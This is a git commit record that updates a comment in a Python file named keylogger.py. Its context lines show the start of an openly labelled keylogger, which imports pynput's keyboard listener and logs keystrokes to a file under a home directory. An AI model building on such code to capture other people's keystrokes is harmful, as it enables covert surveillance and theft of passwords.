82bef0399cc15cc7c38195a35bda3d2ddc7e7f40
sthapukar <stha.pukar.075@gmail.com>
2020-07-24 15:40:21 +0545

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,4 @@
-from pynput.keyboard import Key, Listener       #pynput module to listen for keystrokes
+from pynput.keyboard import Key, Listener       #pynput module to listen for keystrokes(need to install pynput module via pip)
 import logging                    #logging
 log_dir = r"/home/pukar/"       #log file directory (absolute path)
 logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')    #specify log file config
